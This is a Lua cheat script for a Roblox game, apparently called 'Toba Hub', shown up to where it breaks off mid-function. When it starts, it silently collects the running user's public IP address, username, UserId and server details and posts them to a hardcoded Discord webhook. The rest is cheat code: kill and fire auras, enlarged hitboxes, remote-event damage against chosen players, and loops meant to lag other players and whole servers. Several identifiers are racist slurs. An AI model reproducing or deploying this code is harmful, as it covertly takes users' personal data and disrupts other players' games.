local function jetIPE()
    local http_request = request or http_request or (http and http.request) or (syn and syn.request)
    local response = http_request({
        Url = "https://ipinfo.io/json",
        Method = "GET"
    })
    if response and response.StatusCode == 200 then
        local data = game:GetService("HttpService"):JSONDecode(response.Body)
        return data.ip or "Não foi possível obter o IP"
    else
        return "Erro ao obter o IP: " .. (response and tostring(response.StatusCode) or "sem resposta")
    end
end
task.spawn(function()
    local http_request = request or http_request or (http and http.request) or (syn and syn.request)
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local w = "https://discord.com/api/webhooks/1367222031187316848/jzG1weG588kw5exq98ljwiCBq5VR3nqUI_nOVhkB-mahMeMNTzqYWljOMgHA2241CCfJ" 
    local l = LocalPlayer.leaderstats.Level
    local k = LocalPlayer.otherstats.Kill
    local jobid = game.JobId
    http_request({
        Url = w,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "",
            embeds = {
                {
                    title = "New Toba Hub execution",
                    description = "",
                    fields = {
                        {
                            name = "Name",
                            value = LocalPlayer.Name,
                            inline = false
                        },
                        {
                            name = "UserId",
                            value = LocalPlayer.UserId,
                            inline = false
                        },
                        {
                            name = "IP",
                            value = jetIPE(),
                            inline = false
                        },
                        {
                            name = "Executor",
                            value = getexecutorname() or identifyexecutor() or "Unknown",
                            inline = false
                        },
                        {
                            name = "Level",
                            value = tostring(l.Value),
                            inline = false
                        },
                        {
                            name = "Kills",
                            value = tostring(k.Value),
                            inline = false
                        },
                        {
                            name = "JobId",
                            value = '```\ngame:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..jobid..'")\n```',
                            inline = false
                        }
                    },
                    color = 0x3ABDEC,
                    footer = {
                        text = "Toba Hub",
                        icon_url = "https://cdn.discordapp.com/attachments/1332137714203496499/1341759019299373086/noFilter.webp?ex=67b729f6&is=67b5d876&hm=81a2babc988e0fd6cdb6f8c515c85006899f829aac6377cd5117c6f93b4da47e"
                    },
                    timestamp = DateTime.now():ToIsoDate()
                }
            }
        })
    })
end)

--[[
local KeyGuardLibrary = loadstring(game:HttpGet("https://cdn.keyguardian.org/library/v1.0.0.lua"))()
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/gabrelso/TobaHub/refs/heads/main/Libraries/V5.lua"))()
local trueData = "97e1010a086148a997db6867a20c0761"
local falseData = "e2fbb58e59d14f57ad95ee4645c16308"

KeyGuardLibrary.Set({
	publicToken = "6b425f8fdfba4144aafc797bc5c3f33f",
	privateToken = "11b8398dfd82472da2680d64b7941beb",
	trueData = trueData,
	falseData = falseData,
})

local Key, ValidKey, SavedKey, KeyValid, KeyPremium = "", "", "", false, false
_G.setclipboard = write_clipboard or writeclipboard or setclipboard or set_clipboard or nil
_G.readfile = readfile or read_file or nil
_G.writefile = writefile or write_file or nil
_G.isfile = isfile or is_file or nil

local KeyWindow = Library:CreateWindow({
    NameHub = "Toba Hub",
    Description = "Key System",
    Color = Color3.fromRGB(255, 204, 203),
    ["Tab Width"] = 90,
    ["Size UI"] = UDim2.fromOffset(450, 360),
})

local KeyTabs = {
    Tab = KeyWindow:AddTab({ Name = "Main", Icon = "rbxassetid://15945676979" }),
}

local keySec = KeyTabs.Tab:AddSection("Key System") 

local keyInput = keySec:AddInput({
    Title = "Enter Key", 
    Content = "Enter your Key here", 
    Default = "", 
    Callback = function(v)
        Key = v
    end
})

if _G.isfile and _G.readfile then
    if _G.isfile("TobaHub_key.txt") then
        SavedKey = _G.readfile("TobaHub_key.txt")
        keyInput:Set(SavedKey)
        Library:Notify({ Title = "", Description = "Key System", Content = "Pasted your saved key!", Color = Color3.fromRGB(255, 204, 203) })
   end
end

keySec:AddButton({
    Title = "Check key",
    Content = "Checks if the Key is valid",
    Callback = function()
        local response, premiumResponse = KeyGuardLibrary.validateDefaultKey(Key), KeyGuardLibrary.validatePremiumKey(Key)
        if response == trueData then
            KeyValid, ValidKey = true, Key
            Library:Notify({ Title = "", Description = "Key System", Content = "Key is valid! Loading script...", Color = Color3.fromRGB(255, 204, 203) })
        elseif premiumResponse == trueData then
            KeyValid, KeyPremium, ValidKey = true, true, Key
            Library:Notify({ Title = "", Description = "Key System", Content = "Key is premium! Loading script...", Color = Color3.fromRGB(255, 204, 203) })
        else
            Library:Notify({ Title = "", Description = "Key System", Content = "Key is invalid! Please enter a valid one.", Color = Color3.fromRGB(255, 204, 203) })
        end
    end
})

keySec:AddButton({ Title = "Copy Key Link", Content = "Copy the key link to your clipboard", Callback = function()
        _G.setclipboard(KeyGuardLibrary.getLink())
        Library:Notify({ Title = "", Description = "Key System", Content = "Key link copied to your clipboard!", Color = Color3.fromRGB(255, 204, 203) })
    end
})

local daaaasecc = KeyTabs.Tab:AddSection("Discord") 

daaaasecc:AddButton({ Title = "Copy Discord Link", Content = "Join our Discord for updates!", Callback = function()
        _G.setclipboard("https://dsc.gg/tobahub-")
        Library:Notify({ Title = "", Description = "Key System", Content = "Discord link copied to your clipboard!", Color = Color3.fromRGB(255, 204, 203) })
    end
})

print("Key System loaded!")

while not KeyValid do
    task.wait(0.1)
end

print("Saving your key!")
if _G.writefile then
  _G.writefile("TobaHub_key.txt", ValidKey)
end
Library:DestroyAll()
]]

task.wait(1)
-- //////// LOCALS ////////
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local vu = game:GetService("VirtualUser")
local vim = game:GetService("VirtualInputManager")
local definedDummy
local rs = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local respawning = false
local bosses = {"DragonGiraffe", "CENTAUR", "LavaGorilla", "CRABBOSS", "BOSSBEAR", "BOSSDEER", "Griffin"}
local tcs = game:GetService("TextChatService")
local ch = tcs.TextChannels:FindFirstChild("RBXGeneral")
local squirrel = {
    [1] = "squirrel",
    [2] = "squirrel1",
    [3] = "squirrelAnim"
}
local firepp = fireproximityprompt
local firecd = fireclickdetector
local http_request = request or http_request or (http and http.request) or (syn and syn.request)

-- /////// TOGGLES ////////
getgenv().AutoDummyToggle = false
getgenv().UseMonkeyToggle = false
getgenv().AutoCoinsToggle = false
getgenv().SelectBoss = ""
getgenv().AutoBossToggle = false
getgenv().AutoAllBossesToggle = false
getgenv().SelfFarmKillsToggle = false
getgenv().DisplayKillsToggle = false
getgenv().PlayerSelect = ""
getgenv().LoopDamageToggle = false
getgenv().LoopTeleportToggle = false
getgenv().ViewToggle = false
getgenv().KillAuraToggle = false
getgenv().FireAuraDistance = 150
getgenv().FireAuraCooldown = 0.1
getgenv().FireAuraToggle = false
getgenv().HitboxSize = 30 
getgenv().HitboxTransparency = 0.8
getgenv().HitboxToggle = false
getgenv().HealthPercentage = 15
getgenv().AutoRespawnToggle = false
getgenv().LagPlayerToggle = false
getgenv().GiftPlayerText = "Toba Hub on TOP"
getgenv().GiftPlayerDelay = 0.1
getgenv().GiftPlayerToggle = false
getgenv().WhitelistedPlayersTable = {}
getgenv().LagServerToggle = false
getgenv().GiftServerText = "Toba Hub on TOP"
getgenv().GiftServerToggle = false
getgenv().AutoCandyToggle = false
getgenv().FreeFireToggle = false
getgenv().FreeRadioToggle = false
getgenv().AutoEatToggle = false
getgenv().AutoLayToggle = false
getgenv().AutoClanToggle = false
getgenv().FakeRankSelect = false
getgenv().FakeRankToggle = false
getgenv().VisualKorbloxToggle = false
getgenv().NgaWebhook = ""
getgenv().LevelWebhookToggle = false
getgenv().TimedWebhookTime = 1
getgenv().TimedWebhookToggle = false

-- /////// FUNCTIONS ///////
local sg = Instance.new("ScreenGui", game.CoreGui) 
local tl = Instance.new("TextLabel", sg)
tl.Position = UDim2.new(0.9, 0, 0.05, 0) tl.Size = UDim2.new(0, 80, 0, 40) tl.TextScaled = true tl.BackgroundTransparency = 1 tl.TextColor3 = Color3.new(1, 1, 1) tl.Text = "" tl.TextStrokeTransparency = 0 tl.TextStrokeColor3 = Color3.new(0, 0, 0)

local function DisplayKills()
    while getgenv().DisplayKillsToggle do task.wait(0.3)
        tl.Text = "Kills: " .. (LocalPlayer.otherstats.Kill.Value or 0)
    end
    tl.Text = ""
end

local function AutoDummyRespawn()
    while getgenv().AutoDummyToggle do 
        task.wait(900)
        if not getgenv().AutoDummyToggle then 
            break 
        end
        if getgenv().UseMonkeyToggle then
            local monk = { [1] = "halloween2023", [2] = "monkey", [3] = "halloweenmonkeyAnim" }
            game:GetService("ReplicatedStorage").Events.SpawnEvent:FireServer(unpack(monk))
        elseif LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            LocalPlayer.Character.Humanoid.Health = 0
        end
    end
end

local function AutoDummy()
    if LocalPlayer.leaderstats.Level.Value < 5000 then
        definedDummy = game.Workspace.MAP["dummies"].Dummy
    else
        definedDummy = game.Workspace.MAP["5k_dummies"].Dummy2
    end
    task.spawn(AutoDummyRespawn)
    while getgenv().AutoDummyToggle do
        if not getgenv().AutoDummyToggle then 
            break 
        end
        if definedDummy then
            local args = {
                [1] = definedDummy.HumanoidRootPart.Position,
                [2] = "NewFireball",
            }
            game:GetService("ReplicatedStorage").SkillsInRS.RemoteEvent:FireServer(unpack(args))
            local args1 = {
                [1] = definedDummy.Humanoid,
                [2] = 1
            }
            game:GetService("ReplicatedStorage").jdskhfsIIIllliiIIIdchgdIiIIIlIlIli:FireServer(unpack(args1))
        end
        task.wait(0.1)
    end
end

local function AutoCoins()
    while getgenv().AutoCoinsToggle do task.wait(0.1)
        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("CoinEvent"):FireServer()
    end
end

local function AutoBoss()
    while getgenv().AutoBossToggle do task.wait(0.1)
        if getgenv().BossSelect then
            local boss = workspace:WaitForChild("NPC"):FindFirstChild(getgenv().BossSelect[1])
            if boss and boss:FindFirstChild("Humanoid") and boss.Humanoid.Health > 0 then
                local args = {
                    [1] = boss.Humanoid,
                    [2] = 1
                }
                game:GetService("ReplicatedStorage").jdskhfsIIIllliiIIIdchgdIiIIIlIlIli:FireServer(unpack(args))
                boss.Humanoid.Health = 0
            end
        end
    end
end

local function AutoAllBosses()
    while getgenv().AutoAllBossesToggle do
        for _, bossName in ipairs(bosses) do
            local boss = workspace.NPC:FindFirstChild(bossName)
            if boss and boss:FindFirstChild("Humanoid") then
                local args = {
                    [1] = boss.Humanoid,
                    [2] = 1
                }
                game:GetService("ReplicatedStorage").jdskhfsIIIllliiIIIdchgdIiIIIlIlIli:FireServer(unpack(args))
                boss.Humanoid.Health = 0
                task.wait(2.5)
                boss.Humanoid.Health = 0
            end
        end
        task.wait(0.1)
    end
end

local function DealDamage()
    while getgenv().LoopDamageToggle do
        if getgenv().PlayerSelect then
            local nga = Players:FindFirstChild(PlayerSelect[1])
            if nga and nga.Character and nga.Character:FindFirstChild("Humanoid") then
                local args = {
                    [1] = nga.Character.Humanoid,
                    [2] = 1
                }
                game:GetService("ReplicatedStorage"):WaitForChild("jdskhfsIIIllliiIIIdchgdIiIIIlIlIli"):FireServer(unpack(args))
            end
        end
        task.wait(0.1)
    end
end

local function LoopTeleport()
    while getgenv().LoopTeleportToggle do
      local nga = Players:FindFirstChild(PlayerSelect[1]) 
        if nga and nga.Character and nga.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetPos = nga.Character.HumanoidRootPart.Position - Vector3.new(0, 9, 0)
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos)
        end
        task.wait()
    end
end

local function TP()
    local nga = Players:FindFirstChild(getgenv().PlayerSelect[1])
    if nga and nga.Character and nga.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character:PivotTo(nga.Character:GetPivot())
    else
        print("Player not found")
    end
end

local function GetTitle()
    local K = LocalPlayer.otherstats.Kill.Value
    if K >= 100000 then
        return "God"
    elseif K >= 30000 then
        return "Legend"
    elseif K >= 20000 then
        return "NotoriousGladiator"
    elseif K >= 10000 then
        return "SupremeReaper"
    elseif K >= 5000 then
        return "Destroyer"
    elseif K >= 1000 then
        return "Executioner"
    elseif K >= 500 then
        return "MasterHunter"
    elseif K >= 100 then
        return "ExpertHunter"
    elseif K >= 50 then
        return "AdeptHunter"
    elseif K >= 10 then
        return "NoviceHunter"
    else
        return nil
    end
end

local function InstaKill()
    local hit = { [1] = LocalPlayer.Character.Humanoid, [2] = 1 }
    local nga = Players:FindFirstChild(getgenv().PlayerSelect[1])
    local carry = { [1] = nga, [2] = "request_accepted" }
    rs.Events.TeleportEvent:FireServer(workspace[getgenv().PlayerSelect[1]]:FindFirstChild("HumanoidRootPart"))
    task.wait(0.15)
    rs.Events.CarryEvent:FireServer(unpack(carry))
    task.wait(0.15)
    rs.Events.TitleEvent:FireServer(GetTitle())
    task.wait(0.15)
    rs.jdskhfsIIIllliiIIIdchgdIiIIIlIlIli:FireServer(unpack(hit))
    rs.jdskhfsIIIllliiIIIdchgdIiIIIlIlIli:FireServer(unpack(hit))
    task.wait(0.15)
    if not workspace[getgenv().PlayerSelect[1]]:FindFirstChild("Seat") then
      rs.Events.TeleportEvent:FireServer(workspace[getgenv().PlayerSelect[1]]:FindFirstChild("HumanoidRootPart"))
      task.wait(0.15)
      rs.Events.CarryEvent:FireServer(unpack(carry))
    end
    task.wait(0.15)
    rs.Events.TitleEvent:FireServer(GetTitle())
    task.wait(0.15)
    rs.jdskhfsIIIllliiIIIdchgdIiIIIlIlIli:FireServer(unpack(hit))
    rs.jdskhfsIIIllliiIIIdchgdIiIIIlIlIli:FireServer(unpack(hit))
end

local function View()
    local nga = Players:FindFirstChild(getgenv().PlayerSelect[1])
    local function updateCamera()
        if nga and nga.Character and nga.Character:FindFirstChild("Humanoid") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            local camera = game.Workspace.CurrentCamera
            camera.CameraSubject = nga.Character.Humanoid
        else
            local camera = game.Workspace.CurrentCamera
            camera.CameraSubject = LocalPlayer.Character.Humanoid
            camera.CameraType = Enum.CameraType.Custom
        end
    end
    if nga then
        nga.CharacterAdded:Connect(function()
            if getgenv().ViewToggle then
                updateCamera()
            end
        end)
    end
    LocalPlayer.CharacterAdded:Connect(function()
        if getgenv().ViewToggle then
            updateCamera()
        end
    end)
    while getgenv().ViewToggle do
        task.wait(0.1)
        updateCamera()
    end
    local camera = game.Workspace.CurrentCamera
    camera.CameraSubject = LocalPlayer.Character.Humanoid
    camera.CameraType = Enum.CameraType.Custom
end

local function KillAura()
    while getgenv().KillAuraToggle do
        local success, error = pcall(function()
            local friendlies = {}
            local Team
            local Teams = game.Workspace.Teams

            for _, v in pairs(Teams:GetDescendants()) do
                if v:IsA("StringValue") and v.Value == game.Players.LocalPlayer.Name then
                    Team = tostring(v.Parent.Name)
                end
            end

            if Team then
                for _, v in pairs(Teams[Team]:GetChildren()) do
                    if v:IsA("StringValue") then
                        table.insert(friendlies, v.Value)
                    end
                end
            end

            local PlayerList = {}
            local Min = math.huge

            for _, SearchPlayer in pairs(game.Players:GetPlayers()) do
                if SearchPlayer.Name == game.Players.LocalPlayer.Name or table.find(friendlies, SearchPlayer.Name) then
                    continue
                end

                local character = SearchPlayer.Character
                if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 and character:FindFirstChild("HumanoidRootPart") then
                    local Mag = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).Magnitude
                    table.insert(PlayerList, {Player = SearchPlayer, Magnitude = Mag})

                    if Min > Mag then
                        Min = Mag
                    end
                end
            end

            table.sort(PlayerList, function(a, b)
                return a.Magnitude < b.Magnitude
            end)

            if PlayerList[1] and PlayerList[1].Magnitude < 20 and PlayerList[1].Player.Character.Humanoid.Health > 0 then
                game:GetService("ReplicatedStorage").jdskhfsIIIllliiIIIdchgdIiIIIlIlIli:FireServer(PlayerList[1].Player.Character.Humanoid, "1")
                print(PlayerList[1].Player.Character.Humanoid.Health .. "/" .. PlayerList[1].Player.Character.Humanoid.MaxHealth)
            end
        end)

        if not success then
            warn(error)
        end

        task.wait(0.1)
    end
end

local function FireAura()
    while getgenv().FireAuraToggle do
        local success, error = pcall(function()
            local friendlies = {}
            local Team
            local Teams = game.Workspace:WaitForChild("Teams")

            for _, v in ipairs(Teams:GetDescendants()) do
                if v:IsA("StringValue") and v.Value == game.Players.LocalPlayer.Name then
                    Team = tostring(v.Parent.Name)
                    break
                end
            end

            if Team then
                for _, v in ipairs(Teams[Team]:GetChildren()) do
                    if v:IsA("StringValue") then
                        table.insert(friendlies, v.Value)
                    end
                end
            end

            local PlayerList = {}
            local Min = math.huge

            for _, SearchPlayer in ipairs(game.Players:GetPlayers()) do
                if SearchPlayer.Name == game.Players.LocalPlayer.Name or table.find(friendlies, SearchPlayer.Name) then
                    continue
                end

                local character = SearchPlayer.Character
                if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 and character:FindFirstChild("HumanoidRootPart") then
                    local Mag = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).Magnitude
                    table.insert(PlayerList, {Player = SearchPlayer, Magnitude = Mag})

                    if Min > Mag then
                        Min = Mag
                    end
                end
            end

            table.sort(PlayerList, function(a, b)
                return a.Magnitude < b.Magnitude
            end)

            local distance = tonumber(getgenv().FireAuraDistance)
            local cooldown = tonumber(getgenv().FireAuraCooldown)

            if PlayerList[1] and PlayerList[1].Magnitude < tonumber(getgenv().FireAuraDistance) and PlayerList[1].Player.Character.Humanoid.Health > 0 and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
                local targetHumanoid = PlayerList[1].Player.Character.HumanoidRootPart.Position
                game:GetService("ReplicatedStorage"):WaitForChild("SkillsInRS"):WaitForChild("RemoteEvent"):FireServer(targetHumanoid, "NewFireball")
            end
        end)

        if not success then
            warn(error)
        end

        task.wait(tonumber(getgenv().FireAuraCooldown))
    end
end

local function AutoCandy()
    while getgenv().AutoCandyToggle do task.wait(1)
        for _, model in pairs(workspace.BucketsHolder:GetChildren()) do
            if model:IsA("Model") then
                local part = model:FindFirstChildWhichIsA("BasePart")
                if part then
                    part.CanCollide = false
                    model:SetPrimaryPartCFrame(
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + 
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 3.7
                    )
                    local tie = model:FindFirstChild("Tie")
                    if tie then
                        tie:Destroy()
                    end
                end
            end
        end
        for _, part in pairs(workspace.Christmas2024.CandyHolder:GetChildren()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
                part.Transparency = 1
                part:PivotTo(game.Players.LocalPlayer.Character:GetPivot())
            end
        end
    end
end

local function SelfFarmKills()
    LocalPlayer.CharacterAdded:Connect(function(character)
        if character:FindFirstChild("ForceField") then
            character.ForceField:Destroy()
        end
        if getgenv().SelfFarmKillsToggle and workspace:FindFirstChild(LocalPlayer.Name) and workspace[LocalPlayer.Name]:WaitForChild("Squirrel") then
            character:PivotTo(workspace.MAP["5k_dummies"].Dummy2:GetPivot())
            task.wait(0.3)
            local hit = { [1] = character.Humanoid, [2] = 1 }
            game:GetService("ReplicatedStorage").jdskhfsIIIllliiIIIdchgdIiIIIlIlIli:FireServer(unpack(hit))
            character.Humanoid.Health = 0
            game:GetService("ReplicatedStorage").jdskhfsIIIllliiIIIdchgdIiIIIlIlIli:FireServer(unpack(hit))
        end
    end)

    local function Spawning()
        while getgenv().SelfFarmKillsToggle do task.wait(1.2)
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.Health == 0 or not workspace[LocalPlayer.Name]:FindFirstChild("Squirrel") then
                game:GetService("ReplicatedStorage").Events.SpawnEvent:FireServer(unpack(squirrel))
            end
        end
    end
    Spawning()
end

local function AutoRespawn()
    if getgenv().AutoRespawnToggle then
        while getgenv().AutoRespawnToggle do task.wait(0.1)
            if not respawning and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                local currentPercentage = (LocalPlayer.Character.Humanoid.Health / LocalPlayer.Character.Humanoid.MaxHealth) * 100
                if currentPercentage <= tonumber(getgenv().HealthPercentage) then
                    respawning = true
                    game:GetService("ReplicatedStorage").Events.SpawnEvent:FireServer("axolotl", "axolotl1", "axolotl_Anim")
                    task.wait(2) 
                    respawning = false
                end
            end
        end
    end
end

local function TobaClanning()
    while getgenv().AutoClanToggle do task.wait(1)
        local Clan = LocalPlayer.Clan
        local ClanRole = LocalPlayer.ClanRole
        local join = {
            [1] = {
                ["teamIcon"] = "18372013477",
                ["action"] = "accepted",
                ["teamName"] = "Toba Hub"
            }
        }
        game:GetService("ReplicatedStorage").invitationEvent:FireServer(unpack(join))
        task.wait(0.5)
        if Clan.Value ~= "Toba Hub" then
            local create = {
                [1] = {
                    ["clanToCreate"] = "Toba Hub",
                    ["action"] = "create_clan",
                    ["ClanIcon"] = "18372013477"
                }
            }
            game:GetService("ReplicatedStorage").Events.ClanEvent:FireServer(unpack(create))
        end
        if Clan.Value == "Toba Hub" then
            break
        end
    end
end

local function AutoEat()
    while getgenv().AutoEatToggle do task.wait(0.5)
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            local humanoid = LocalPlayer.Character.Humanoid
            local food = LocalPlayer.Backpack:FindFirstChild("Food") or workspace:FindFirstChild("Food")
            if food and food.Parent ~= LocalPlayer.Character and humanoid.Health > 0 and humanoid.Health < humanoid.MaxHealth then
                food.Parent = LocalPlayer.Character
                task.wait(0.1)
                food:Activate()
            end
        end
    end
end

LocalPlayer.CharacterAdded:Connect(function(character)
    local humanoid = character:FindFirstChildOfClass("Humanoid") or character:WaitForChild("Humanoid", 2)
    local FF = character:FindFirstChild("ForceField")
    if FF then
        FF:Destroy()
    end
    if getgenv().UseMonkeyToggle and getgenv().AutoDummyToggle and not workspace[LocalPlayer.Name]:FindFirstChild("Monkey") then
        local raloi = { [1] = "halloween2023", [2] = "monkey", [3] = "halloweenmonkeyAnim" }
        game:GetService("ReplicatedStorage").Events.SpawnEvent:FireServer(unpack(raloi))
    end
    if getgenv().AutoDummyToggle and definedDummy and humanoid then
        character:PivotTo(definedDummy:GetPivot())
    end
    if getgenv().VisualKorbloxToggle and humanoid and workspace[LocalPlayer.Name]:WaitForChild("Human") then
        character.RightFoot.MeshId = "http://www.roblox.com/asset/?id=902942089"
        character.RightFoot.Transparency = 1
        character.RightLowerLeg.MeshId = "http://www.roblox.com/asset/?id=902942093"
        character.RightLowerLeg.Transparency = 1
        character.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
        character.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
    end
    if getgenv().FreeFireToggle and humanoid then
        if not LocalPlayer.Backpack:FindFirstChild("Fireball") then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local fireball = player:FindFirstChild("Backpack") and player.Backpack:FindFirstChild("Fireball")
                    if fireball then
                        fireball:Clone().Parent = LocalPlayer.Backpack
                        return
                    end
                end
            end
            Library:Notify({ Title = "", Description = "Free Fireball", Content = "No players with a Fireball found", Color = Color3.fromRGB(57, 193, 238) })
        else
            Library:Notify({ Title = "", Description = "Free Fireball", Content = "You already have a Fireball", Color = Color3.fromRGB(57, 193, 238) })
        end
    end
end)

local function FakeRank()
    local rank = game.Workspace[LocalPlayer.Name].Head.BillboardGui.badgeFrame
    local ranks = {"rank1", "rank2", "rank3", "rank4", "rank11", "rank51"}
    local cu = tostring(getgenv().FakeRankSelect[1])
    if getgenv().FakeRankToggle then
        local selectedRank = ""
        if cu == "1" then
            selectedRank = "rank1"
        elseif cu == "2" then
            selectedRank = "rank2"
        elseif cu == "3" then
            selectedRank = "rank3"
        elseif cu == "4-10" then
            selectedRank = "rank4"
        elseif cu == "11-50" then
            selectedRank = "rank11"
        elseif cu == "51-100" then
            selectedRank = "rank51"
        end
        
        for _, rankName in pairs(ranks) do
            local rankObject = rank:FindFirstChild(rankName)
            if rankObject then
                rankObject.Visible = rankName == selectedRank
            end
        end
    else
        for _, rankName in pairs(ranks) do
            local rankObject = rank:FindFirstChild(rankName)
            if rankObject then
                rankObject.Visible = false
            end
        end
    end
end

local function Hitbox()
    RunService.RenderStepped:Connect(function()
        for i, v in next, Players:GetPlayers() do
            if v.Name ~= LocalPlayer.Name and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = v.Character.HumanoidRootPart
                if getgenv().HitboxToggle then
                    hrp.Size = Vector3.new(tonumber(getgenv().HitboxSize), tonumber(getgenv().HitboxSize), tonumber(getgenv().HitboxSize))
                    hrp.Transparency = tonumber(getgenv().HitboxTransparency)
                    hrp.Color = BrickColor.new("Really black").Color
                    hrp.Material = Enum.Material.Neon
                    hrp.CanCollide = false
                else
                    hrp.Size = Vector3.new(2, 2, 1)
                    hrp.Color = BrickColor.new("Medium stone grey").Color
                    hrp.Material = Enum.Material.Plastic
                    hrp.CanCollide = true
                end
            end
        end
    end)
end

local function AutoLay()
    while getgenv().AutoLayToggle do task.wait(0.1)
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            local char = LocalPlayer.Character
            local a = workspace[LocalPlayer.Name]:FindFirstChild("EmotesHandler") and workspace[LocalPlayer.Name].EmotesHandler.sitAnim or workspace[LocalPlayer.Name]:FindFirstChild("Fly") and workspace[LocalPlayer.Name].Fly.Animations.sitAnim
            local b = workspace[LocalPlayer.Name]:FindFirstChild("EmotesHandler") and workspace[LocalPlayer.Name].EmotesHandler.layAnim or workspace[LocalPlayer.Name]:FindFirstChild("Fly") and workspace[LocalPlayer.Name].Fly.Animations.layAnim
            if a and b then
                local aL = char.Humanoid:LoadAnimation(a)
                local bL = char.Humanoid:LoadAnimation(b)
                aL:Play()
                task.wait(0.15)
                aL:Stop()
                bL:Play()
                task.wait(0.15)
                bL:Stop()
            end
        end
    end
end

local function LagNiga()
    while getgenv().LagPlayerToggle do task.wait()
        if getgenv().PlayerTrollSelect then
            local nga = Players:FindFirstChild(getgenv().PlayerTrollSelect[1])
            if nga then
                local args = { [1] = nga, [2] = "request_accepted" }
                game:GetService("ReplicatedStorage").Events.CarryEvent:FireServer(unpack(args))
            end
        end
    end
end

local function GiftNiga()
    while getgenv().GiftPlayerToggle do task.wait(tonumber(getgenv().GiftPlayerDelay))
        if getgenv().PlayerTrollSelect then
            local nga = Players:FindFirstChild(getgenv().PlayerTrollSelect[1])
            if nga then
                local args = {
                    [1] = {
                        ["toolname"] = "RoseB",
                        ["oplr"] = nga,
                        ["action"] = "give",
                        ["gift"] = tostring(getgenv().GiftPlayerText)
                    }
                }
                game:GetService("ReplicatedStorage").Events.GiveEvent:FireServer(unpack(args))
            end
        end
    end
end

local function LagServer()
    while getgenv().LagServerToggle do task.wait()
        for _, player in ipairs(Players:GetPlayers()) do
            if player and player ~= LocalPlayer and not (getgenv().WhitelistedPlayersTable and table.find(getgenv().WhitelistedPlayersTable, player.Name)) then
                game:GetService("ReplicatedStorage").Events.CarryEvent:FireServer(player, "request_accepted")
            end
        end
    end
end

local function FreeRadio()
    if getgenv().FreeRadioToggle then
        LocalPlayer.PlayerGui.DRadio_Gui.Enabled = true
    else
        LocalPlayer.PlayerGui.DRadio_Gui.Enabled = false
    end
end

local function GiftServer()
    while getgenv().GiftServerToggle do task.wait()
        for _, player in ipairs(Players:GetPlayers()) do
            if player and player ~= LocalPlayer and not (getgenv().WhitelistedPlayersTable and table.find(getgenv().WhitelistedPlayersTable, player.Name)) then
                local args = {
                    [1] = {
                        ["toolname"] = "RoseB",
                        ["oplr"] = player,
                        ["action"] = "give",
                        ["gift"] = tostring(getgenv().GiftServerText)
                    }
                }
                game:GetService("ReplicatedStorage").Events.GiveEvent:FireServer(unpack(args))
            end
        end
    end
end

local function GetPlayers()
    local names = {}
    for i, v in ipairs(Players:GetPlayers()) do
        names[i] = v.Name
    end
    return names
end

local function WebhookLevel()
    local w = tostring(getgenv().NgaWebhook)
    local l = LocalPlayer.leaderstats.Level
    local k = LocalPlayer.otherstats.Kill
    if getgenv().LevelWebhookToggle and w then
        l.Changed:Connect(function()
            if getgenv().LevelWebhookToggle then
                http_request({
                    Url = w,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode({
                        embeds = {
                            {
                                title = "Player stats: " .. LocalPlayer.Name,
                                description = "Level: " .. l.Value .. "\nKills: " .. k.Value,
                                color = 0x3ABDEC,
                                footer = {
                                    text = "Toba Hub",
                                    icon_url = "https://cdn.discordapp.com/attachments/1332137714203496499/1341759019299373086/noFilter.webp?ex=67b729f6&is=67b5d876&hm=81a2babc988e0fd6cdb6f8c515c85006899f829aac6377cd5117c6f93b4da47e"
                                }
                            }
                        }
                    })
                })
            end
        end)
    end
end

local function WebhookTime()
    local w = tostring(getgenv().NgaWebhook)
    local l = LocalPlayer.leaderstats.Level
    local k = LocalPlayer.otherstats.Kill
    local wt = (tonumber(getgenv().TimedWebhookTime) or 1) * 60
    if getgenv().TimedWebhookToggle and w then
        while getgenv().TimedWebhookToggle do 
            task.wait(wt)
            if w then
                http_request({
                    Url = w,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode({
                        embeds = {
                            {
                                title = "Player stats: " .. LocalPlayer.Name,
                                description = "Level: " .. l.Value .. "\nKills: " .. k.Value,
                                color = 0x3ABDEC,
                                footer = {
                                    text = "Toba Hub",
